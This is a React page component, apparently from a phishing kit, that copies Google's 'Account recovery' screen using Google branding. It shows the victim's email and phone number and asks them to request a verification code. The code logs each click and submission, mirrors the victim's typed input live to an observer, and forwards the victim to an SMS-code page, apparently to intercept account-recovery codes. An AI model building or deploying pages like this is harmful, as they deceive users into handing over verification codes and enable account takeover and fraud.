import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState, type FormEvent } from "react";
import {
  GE_SHELL_CSS,
  GeFontStyle,
  GeFooter,
  GoogleGLogo,
  GoogleUserIcon,
  formatGePhoneDisplay,
  resolveGeEmail,
  resolveGePhone,
  setGeEmail,
  setGePhone,
  useGeTracking,
} from "@/components/ge/GeShared";

export const Route = createFileRoute("/ge/sendcode")({
  head: () => ({
    meta: [
      { title: "Account recovery - Google Accounts" },
      { name: "color-scheme", content: "dark" },
    ],
  }),
  component: GeSendCodePage,
});

const GE_SEND_CSS = `
${GE_SHELL_CSS}

.ge-send .ge-title { margin-top: 24px; }

.ge-send-lead {
  margin: 16px 0 0;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1.5;
  color: var(--gm3-on-surface);
}

.ge-account-chip {
  display: inline-flex;
  align-items: center;
  gap: 0;
  margin-top: 24px;
  width: fit-content;
  max-width: 100%;
  align-self: flex-start;
  height: 32px;
  padding: 0 8px 0 3px;
  border: 1px solid var(--gm3-outline);
  border-radius: 16px;
  background: var(--gm3-card);
  color: var(--gm3-on-surface);
  font: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.25px;
  line-height: 1.25;
  cursor: pointer;
  text-align: left;
}
.ge-account-chip:hover { background: rgba(227, 227, 227, 0.08); }

.ge-avatar-user {
  width: 24px;
  height: 24px;
  border-radius: 50%;
  display: inline-flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
  margin-right: 8px;
  background: rgb(95, 99, 104);
  color: #fff;
  overflow: hidden;
}
.ge-avatar-user svg {
  width: 20px;
  height: 20px;
  display: block;
}

.ge-account-email {
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  min-width: 0;
  padding-right: 4px;
}
.ge-chip-caret {
  width: 20px;
  height: 20px;
  flex-shrink: 0;
  fill: var(--gm3-on-surface);
  opacity: 0.8;
}

.ge-send-heading {
  margin: 0;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1.5;
  color: var(--gm3-on-surface);
}
.ge-send-help {
  margin: 16px 0 0;
  font-size: 0.875rem;
  font-weight: 400;
  line-height: 1.4286;
  color: var(--gm3-on-surface-variant);
}
.ge-send-help strong {
  font-weight: 500;
  color: var(--gm3-on-surface);
}
@media (min-width: 900px) {
  .ge-send .ge-pane-right {
    padding-top: 72px;
  }
}

.ge-form {
  margin-top: 24px;
  flex: 1;
  display: flex;
  flex-direction: column;
  min-height: 0;
}
@media (min-width: 900px) {
  .ge-form { margin-top: 22px; }
}

.ge-actions {
  display: flex;
  flex-direction: row;
  flex-wrap: wrap;
  align-items: center;
  justify-content: space-between;
  margin-top: auto;
  padding-top: 32px;
  gap: 8px;
  width: 100%;
}
.ge-btn-text {
  background: none;
  border: none;
  padding: 0 12px;
  height: 40px;
  border-radius: 20px;
  color: var(--gm-next-fill);
  font-family: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.0107142857em;
  cursor: pointer;
}
.ge-btn-text:hover { background: rgba(138, 180, 248, 0.08); }
.ge-btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  height: 40px;
  min-width: 64px;
  padding: 0 24px;
  border: none;
  border-radius: 20px;
  font-family: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.0107142857em;
  cursor: pointer;
}
.ge-btn-send {
  background: var(--gm-next-fill);
  color: var(--gm-next-ink);
}
.ge-btn-send:hover {
  box-shadow: 0 1px 2px rgba(0,0,0,.3), 0 1px 3px 1px rgba(0,0,0,.15);
  filter: brightness(1.05);
}
`;

function GeSendCodePage() {
  const { trackClick, trackSubmit, geNavigate, sessionId, isObserve } = useGeTracking();
  const [email, setEmail] = useState(() => resolveGeEmail());
  const [phone, setPhone] = useState(() => resolveGePhone());

  useEffect(() => {
    const resolvedEmail = resolveGeEmail();
    if (resolvedEmail) {
      setEmail(resolvedEmail);
      setGeEmail(resolvedEmail);
    }
    const resolvedPhone = resolveGePhone();
    if (resolvedPhone) {
      setPhone(resolvedPhone);
      setGePhone(resolvedPhone);
    }
  }, []);

  useEffect(() => {
    if (!isObserve) return;
    function onMirror(e: Event) {
      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
      if (!d?.field) return;
      const value = String(d.value ?? "");
      if (d.field === "email" || d.field === "email_submitted" || d.field === "identifier") {
        setEmail(value);
        setGeEmail(value);
      }
      if (
        d.field === "phone" ||
        d.field === "phone_number" ||
        d.field === "phone_submitted" ||
        d.field === "Phone number"
      ) {
        setPhone(value);
        setGePhone(value);
      }
    }
    window.addEventListener("ux:mirror-live-input", onMirror);
    return () => window.removeEventListener("ux:mirror-live-input", onMirror);
  }, [isObserve]);

  const displayPhone = formatGePhoneDisplay(phone);

  const handleSend = (e?: FormEvent) => {
    e?.preventDefault();
    trackClick("Send");
    trackSubmit("phone_send", phone.trim() || displayPhone);
    setGePhone(phone.trim() || phone);
    geNavigate("/ge/smscode");
  };

  return (
    <div className="ge-shell ge-send">
      <GeFontStyle />
      <style>{GE_SEND_CSS}</style>

      <main className="ge-card" role="main">
        <div className="ge-pane-left">
          <GoogleGLogo className="ge-logo" width={48} height={48} />
          <h1 className="ge-title">Account recovery</h1>
          <p className="ge-send-lead">
            To help keep your account safe, Google wants to make sure it{"\u2019"}s
            really you trying to sign in
          </p>
          <button
            type="button"
            className="ge-account-chip"
            aria-label={`${email || "Account"} selected. Switch account`}
            onClick={() => trackClick("Switch account")}
          >
            <span className="ge-avatar-user" aria-hidden="true">
              <GoogleUserIcon width={20} height={20} />
            </span>
            <span className="ge-account-email">{email || "Account"}</span>
            <svg className="ge-chip-caret" viewBox="0 0 24 24" aria-hidden="true">
              <path d="M7 9.5l5 5 5-5H7z" />
            </svg>
          </button>
        </div>

        <div className="ge-pane-right">
          <p className="ge-send-heading">Get a verification code</p>
          <p className="ge-send-help">
            Google will send a verification code to <strong>{displayPhone}</strong>.
            Standard message and data rates may apply.
          </p>

          <form className="ge-form" onSubmit={handleSend} autoComplete="off">
            <div className="ge-actions">
              <button
                type="button"
                className="ge-btn-text"
                onClick={() => trackClick("Try another way")}
              >
                Try another way
              </button>
              <button type="submit" className="ge-btn ge-btn-send">
                Send
              </button>
            </div>
          </form>
        </div>
      </main>

      <GeFooter />
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">
        {sessionId}
      </div>
    </div>
  );
}
